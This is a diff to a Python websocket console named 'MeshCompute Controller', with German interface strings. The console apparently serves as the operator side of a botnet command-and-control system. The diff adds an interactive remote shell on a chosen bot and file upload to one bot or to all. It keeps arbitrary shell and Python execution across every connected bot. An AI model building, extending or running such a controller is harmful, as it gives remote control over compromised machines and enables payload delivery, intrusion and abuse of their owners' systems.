@@ -1,7 +1,10 @@
 import asyncio
-import websockets
 import json
+import os
+import base64
 import logging
+import websockets
+
 from colorama import init, Fore, Style
 from dotenv import load_dotenv
 from common.config import SERVER_URL, AUTH_TOKEN
@@ -15,16 +18,20 @@ INTRO = f"""{Fore.CYAN}
 =====================================
       MeshCompute Controller
 =====================================
-Befehle: list | exec <bot|all> <cmd> | sysinfo <bot|all>
-         python <bot|all> <code> | ps <bot|all> | ping <bot|all> | exit
+Befehle: list | shell <bot> | upload <bot|all> <file> | exec <bot|all> <cmd>
+         sysinfo <bot|all> | ps <bot|all> | ping <bot|all> | exit
 ====================================={Style.RESET_ALL}"""
+
 PROMPT = f"\n{Fore.GREEN}meshctrl > {Style.RESET_ALL}"
+
 
 class MeshController:
     def __init__(self):
         self.ws = None
         self.connected = False
         self.task_counter = 0
+        self.in_shell = False
+        self.current_shell_task = None
 
     def next_task_id(self):
         self.task_counter += 1
@@ -32,7 +39,7 @@ class MeshController:
 
     async def connect(self):
         try:
-            self.ws = await websockets.connect(SERVER_URL, ping_interval=20)
+            self.ws = await websockets.connect(SERVER_URL, ping_interval=20, ping_timeout=40)
             await self.ws.send(json.dumps({
                 "type": "controller",
                 "auth_token": AUTH_TOKEN
@@ -50,7 +57,7 @@ class MeshController:
 
         try:
             await self.ws.send(json.dumps(command))
-            response_raw = await asyncio.wait_for(self.ws.recv(), timeout=30)
+            response_raw = await asyncio.wait_for(self.ws.recv(), timeout=25)
             response = json.loads(response_raw)
             self._print_result(response)
         except asyncio.TimeoutError:
@@ -60,16 +67,33 @@ class MeshController:
             self.connected = False
 
     def _print_result(self, data: dict):
-        if data.get("type") == "error":
-            print(f"{Fore.RED}Fehler: {data.get('message')}{Style.RESET_ALL}")
+        if data.get("type") == "shell_output":
+            print(data.get("output", ""), end="", flush=True)
             return
 
+        if data.get("type") == "shell_exit":
+            print(f"\n{Fore.YELLOW}Shell wurde beendet.{Style.RESET_ALL}")
+            self.in_shell = False
+            self.current_shell_task = None
+            return
+
+        if data.get("type") == "info":
+            print(f"{Fore.CYAN}{data.get('message')}{Style.RESET_ALL}")
+            return
+
+        if data.get("type") == "file_upload_done":
+            if data.get("error"):
+                print(f"{Fore.RED}Upload fehlgeschlagen: {data['error']}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.GREEN}✅ Upload erfolgreich{Style.RESET_ALL}")
+            return
+
+        # Normale Ergebnisse
         if "bots" in data.get("data", {}):
             bots = data["data"]["bots"]
             print(f"\n{Fore.CYAN}=== Verbundene Bots ({len(bots)}) ==={Style.RESET_ALL}")
             for bot in bots:
-                color = Fore.GREEN if bot.get("status") == "online" else Fore.RED
-                print(f"  {color}{bot['bot_id']}{Style.RESET_ALL} | {bot.get('hostname', 'n/a')}")
+                print(f"  {Fore.GREEN}{bot.get('bot_id')}{Style.RESET_ALL}")
             return
 
         bot_id = data.get("bot_id", "Unknown")
@@ -79,62 +103,156 @@ class MeshController:
             for k, v in data["info"].items():
                 if k != "bot_id":
                     print(f"  {k:12}: {v}")
-        elif data.get("processes"):
-            for p in data["processes"][:20]:
-                print(f"  {p['pid']:6} {p['name'][:40]:40} CPU: {p.get('cpu',0):.1f}%")
-        elif data.get("output") is not None:
-            print(data["output"].strip() or "(keine Ausgabe)")
-            if data.get("error"):
-                print(f"{Fore.RED}stderr: {data['error']}{Style.RESET_ALL}")
-        elif data.get("success") is not None:
-            status = Fore.GREEN if data["success"] else Fore.RED
-            print(f"{status}{data.get('message', 'OK')}{Style.RESET_ALL}")
+        elif data.get("output"):
+            print(data["output"].strip())
+        elif data.get("message"):
+            print(data["message"])
         else:
             print(json.dumps(data, indent=2, ensure_ascii=False))
+
+    # ====================== SHELL MODE ======================
+    async def shell_mode(self, bot_id: str, task_id: str):
+        self.in_shell = True
+        self.current_shell_task = task_id
+        print(f"{Fore.YELLOW}=== Interactive Shell @ {bot_id} (exit zum verlassen) ==={Style.RESET_ALL}")
+
+        try:
+            while self.in_shell:
+                cmd = await asyncio.get_event_loop().run_in_executor(
+                    None, input, f"shell@{bot_id.split('-')[0]}> "
+                )
+                if not cmd.strip():
+                    continue
+
+                if cmd.lower() in ["exit", "quit"]:
+                    await self.ws.send(json.dumps({
+                        "type": "shell_input",
+                        "command": "exit",
+                        "task_id": task_id
+                    }))
+                    break
+
+                await self.ws.send(json.dumps({
+                    "type": "shell_input",
+                    "command": cmd,
+                    "task_id": task_id
+                }))
+        except Exception:
+            pass
+        finally:
+            self.in_shell = False
+            self.current_shell_task = None
+            print(f"{Fore.YELLOW}Shell beendet.{Style.RESET_ALL}")
 
     async def handle_command(self, line: str):
         line = line.strip()
         if not line:
             return
-        parts = line.split(None, 1)
-        cmd = parts[0].lower()
-        arg = parts[1] if len(parts) > 1 else ""
 
+        parts = line.split()
+        cmd = parts[0].lower()
+
+        # ==================== SHELL ====================
+        if cmd == "shell":
+            if len(parts) < 2:
+                print("Verwendung: shell <bot_id>")
+                return
+            target = parts[1]
+            task_id = self.next_task_id()
+            await self.send_command({
+                "type": "command",
+                "action": "shell",
+                "target": target,
+                "task_id": task_id
+            })
+            await asyncio.sleep(0.3)
+            await self.shell_mode(target, task_id)
+            return
+
+        # ==================== NORMAL COMMANDS ====================
         if cmd == "list":
             await self.send_command({"type": "command", "action": "list", "task_id": self.next_task_id()})
+
+        elif cmd == "upload":
+            if len(parts) < 3:
+                print("Verwendung: upload <bot|all> <local_path> [remote_name]")
+                return
+            target = parts[1]
+            local_path = parts[2]
+            remote_name = parts[3] if len(parts) > 3 else None
+            await self.upload_file(target, local_path, remote_name)
+
         elif cmd == "exec":
-            sub = arg.split(None, 1)
-            if len(sub) < 2:
-                print("Verwendung: exec <bot_id|all> <befehl>")
+            if len(parts) < 3:
+                print("Verwendung: exec <bot|all> <befehl>")
                 return
-            target, payload = sub
-            await self.send_command({"type": "command", "action": "exec", "target": target, "payload": payload, "task_id": self.next_task_id()})
+            target = parts[1]
+            payload = " ".join(parts[2:])
+            await self.send_command({
+                "type": "command", "action": "exec", "target": target,
+                "payload": payload, "task_id": self.next_task_id()
+            })
+
         elif cmd in ("sysinfo", "ps", "ping"):
-            target = arg.strip() or "all"
-            await self.send_command({"type": "command", "action": cmd, "target": target, "task_id": self.next_task_id()})
+            target = parts[1] if len(parts) > 1 else "all"
+            await self.send_command({
+                "type": "command", "action": cmd, "target": target,
+                "task_id": self.next_task_id()
+            })
+
         elif cmd == "python":
-            sub = arg.split(None, 1)
-            if len(sub) < 2:
-                print("Verwendung: python <bot_id|all> <code>")
+            if len(parts) < 3:
+                print("Verwendung: python <bot|all> <code>")
                 return
-            target, payload = sub
-            await self.send_command({"type": "command", "action": "python", "target": target, "payload": payload, "task_id": self.next_task_id()})
+            target = parts[1]
+            payload = " ".join(parts[2:])
+            await self.send_command({
+                "type": "command", "action": "python", "target": target,
+                "payload": payload, "task_id": self.next_task_id()
+            })
+
         elif cmd in ("exit", "quit"):
-            print(f"{Fore.YELLOW}Beende Controller...{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Controller wird beendet...{Style.RESET_ALL}")
             if self.ws:
                 await self.ws.close()
             raise SystemExit
+
         elif cmd in ("clear", "cls"):
-            print("\033c", end="")
+            os.system('cls' if os.name == 'nt' else 'clear')
+
         elif cmd == "help":
-            print("Verfügbare Befehle: list, exec, sysinfo, python, ps, ping, clear, exit")
+            print(INTRO)
         else:
             print(f"{Fore.RED}Unbekannter Befehl. Tippe 'help'.{Style.RESET_ALL}")
+
+    async def upload_file(self, target: str, local_path: str, remote_name: str = None):
+        if not os.path.exists(local_path):
+            print(f"{Fore.RED}Datei nicht gefunden.{Style.RESET_ALL}")
+            return
+        try:
+            with open(local_path, "rb") as f:
+                data = f.read()
+            content_b64 = base64.b64encode(data).decode('utf-8')
+            filename = remote_name or os.path.basename(local_path)
+
+            await self.ws.send(json.dumps({
+                "type": "command",
+                "action": "upload",
+                "target": target,
+                "filename": filename,
+                "content": content_b64,
+                "task_id": self.next_task_id()
+            }))
+            print(f"{Fore.CYAN}📤 Upload gestartet...{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}Upload Fehler: {e}{Style.RESET_ALL}")
+
 
 async def main():
     print(INTRO)
     ctrl = MeshController()
     await ctrl.connect()
+
     if not ctrl.connected:
         return
 
@@ -145,7 +263,8 @@ async def main():
         except (KeyboardInterrupt, SystemExit):
             break
         except Exception as e:
-            print(f"Fehler: {e}")
+            print(f"{Fore.RED}Fehler: {e}{Style.RESET_ALL}")
+
 
 if __name__ == "__main__":
     asyncio.run(main())
